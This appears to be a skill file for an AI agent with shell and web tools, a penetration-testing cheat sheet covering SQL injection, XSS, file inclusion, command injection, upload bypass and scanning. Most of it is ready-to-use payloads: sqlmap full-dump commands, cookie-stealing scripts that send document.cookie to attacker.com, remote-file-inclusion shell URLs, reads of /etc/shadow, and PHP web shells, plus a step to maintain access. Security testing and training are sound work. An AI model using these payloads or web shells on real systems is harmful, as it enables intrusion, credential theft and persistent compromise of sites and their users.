---
name: web-vulnerability-testing
description: Comprehensive web application vulnerability testing techniques including SQLi, XSS, LFI, RFI, and authentication bypass
allowed-tools: Bash, Read, Write, WebFetch
---

# Web Vulnerability Testing Skill

## Purpose
This skill provides systematic approaches for identifying and exploiting common web application vulnerabilities during authorized penetration testing.

## SQL Injection Testing

### Manual Detection
```bash
# Basic SQLi test strings
' OR '1'='1
' OR 1=1--
' OR 1=1#
' OR 1=1/*
admin' --
admin' #
admin'/*
' or 1=1--
' or 1=1#
' or 1=1/*
') or '1'='1--
') or ('1'='1--
```

### SQLMap Automation
```bash
# Basic scan
sqlmap -u "http://{target}/page.php?id=1" --batch --banner

# Post request
sqlmap -u "http://{target}/login.php" --data="username=admin&password=test" --batch

# Full enumeration
sqlmap -u "http://{target}/page.php?id=1" --batch --dbs --tables --columns --dump

# With cookie
sqlmap -u "http://{target}/page.php?id=1" --cookie="PHPSESSID=abc123" --batch

# Aggressive testing
sqlmap -u "http://{target}/page.php?id=1" --level=5 --risk=3 --batch
```

## Cross-Site Scripting (XSS)

### Reflected XSS Payloads
```javascript
<script>alert('XSS')</script>
<script>alert(document.cookie)</script>
<img src=x onerror=alert('XSS')>
<svg onload=alert('XSS')>
<body onload=alert('XSS')>
<iframe src=javascript:alert('XSS')>
```

### Stored XSS Testing
```javascript
<script>document.location='http://attacker.com/steal.php?cookie='+document.cookie</script>
<script>new Image().src="http://attacker.com/steal.php?cookie="+document.cookie;</script>
```

### DOM-based XSS
```javascript
#<script>alert('XSS')</script>
javascript:alert('XSS')
data:text/html,<script>alert('XSS')</script>
```

## Local File Inclusion (LFI)

### Linux LFI Payloads
```bash
../../../../etc/passwd
../../../../etc/shadow
../../../../etc/hosts
../../../../proc/self/environ
../../../../var/log/apache2/access.log
../../../../var/log/apache2/error.log
/etc/passwd
```

### Windows LFI Payloads
```bash
..\..\..\..\windows\system32\drivers\etc\hosts
..\..\..\..\windows\win.ini
..\..\..\..\windows\system.ini
C:\Windows\System32\drivers\etc\hosts
```

### PHP Wrappers
```bash
php://filter/convert.base64-encode/resource=index.php
php://input
php://filter/read=string.rot13/resource=index.php
expect://ls
data://text/plain,<?php phpinfo(); ?>
```

## Remote File Inclusion (RFI)

### RFI Testing
```bash
http://attacker.com/shell.txt
http://attacker.com/shell.txt?
http://attacker.com/shell.txt%00
\\attacker.com\shell.txt
```

## Command Injection

### Command Injection Payloads
```bash
; ls -la
| ls -la
|| ls -la
& ls -la
&& ls -la
`ls -la`
$(ls -la)
; ping -c 10 attacker.com
| ping -c 10 attacker.com
```

## Authentication Bypass

### SQL Injection Auth Bypass
```sql
admin' --
admin' #
admin'/*
' or 1=1--
' or 1=1#
' or '1'='1
') or ('1'='1
```

### Default Credentials
```bash
admin:admin
admin:password
admin:123456
root:root
root:toor
guest:guest
test:test
```

## Directory Traversal

### Traversal Patterns
```bash
../
..\
..\/
%2e%2e%2f
%252e%252e%252f
..%252f
..%c0%af
```

## File Upload Vulnerabilities

### Bypass Techniques
```bash
# Double extension
shell.php.jpg

# Null byte
shell.php%00.jpg

# Case variation
shell.PHP
shell.pHp

# Alternative extensions
shell.php3
shell.php4
shell.php5
shell.phtml

# Content-Type bypass
Content-Type: image/jpeg
```

### Web Shells
```php
# Simple PHP shell
<?php system($_GET['cmd']); ?>
<?php passthru($_REQUEST['cmd']); ?>
<?php eval($_POST['cmd']); ?>
```

## Automated Scanning Tools

### Directory Enumeration
```bash
# Gobuster
gobuster dir -u http://{target} -w /usr/share/wordlists/dirb/common.txt -x php,html,txt

# Dirb
dirb http://{target} /usr/share/wordlists/dirb/common.txt

# FFuf
ffuf -w /usr/share/wordlists/dirb/common.txt -u http://{target}/FUZZ
```

### Nikto Scanning
```bash
nikto -h http://{target}
nikto -h http://{target} -ssl
nikto -h http://{target} -p 80,443,8080
```

### WPScan (WordPress)
```bash
wpscan --url http://{target}
wpscan --url http://{target} --enumerate u
wpscan --url http://{target} --enumerate vp
```

## OWASP Top 10 Testing

### A01:2021 – Broken Access Control
- Test for IDOR vulnerabilities
- Check horizontal/vertical privilege escalation
- Test for forced browsing

### A02:2021 – Cryptographic Failures
- Check for sensitive data in URLs
- Test for weak encryption
- Look for hardcoded credentials

### A03:2021 – Injection
- SQL injection testing
- Command injection testing
- LDAP injection testing

### A04:2021 – Insecure Design
- Business logic flaws
- Race conditions
- Design-level security issues

### A05:2021 – Security Misconfiguration
- Default configurations
- Unnecessary features enabled
- Verbose error messages

## Exploitation Workflow

1. **Information Gathering**
   - Identify technologies (Wappalyzer, WhatWeb)
   - Enumerate directories and files
   - Check robots.txt, sitemap.xml

2. **Vulnerability Discovery**
   - Test all input points
   - Check authentication mechanisms
   - Analyze client-side code

3. **Exploitation**
   - Develop proof-of-concept
   - Escalate privileges if possible
   - Maintain access for testing

4. **Documentation**
   - Screenshot vulnerabilities
   - Record exploitation steps
   - Note impact and remediation

## Best Practices

1. **Always test on authorized targets only**
2. **Start with automated scanning for efficiency**
3. **Manually verify automated findings**
4. **Test business logic thoroughly**
5. **Document everything for reporting**
6. **Check for chained vulnerabilities**

## Response Analysis

### Indicators of Vulnerability
- Error messages with stack traces
- Database errors
- Time delays in responses
- Different response lengths
- Unexpected redirects
- Successfully executed commands

## Reporting Template

```markdown
## Vulnerability: [Name]
**Severity**: Critical/High/Medium/Low
**CVSS Score**: X.X

### Description
[Detailed description of the vulnerability]

### Proof of Concept
[Step-by-step exploitation]

### Impact
[Business impact of the vulnerability]

### Remediation
[How to fix the vulnerability]

### References
[OWASP, CWE links]
```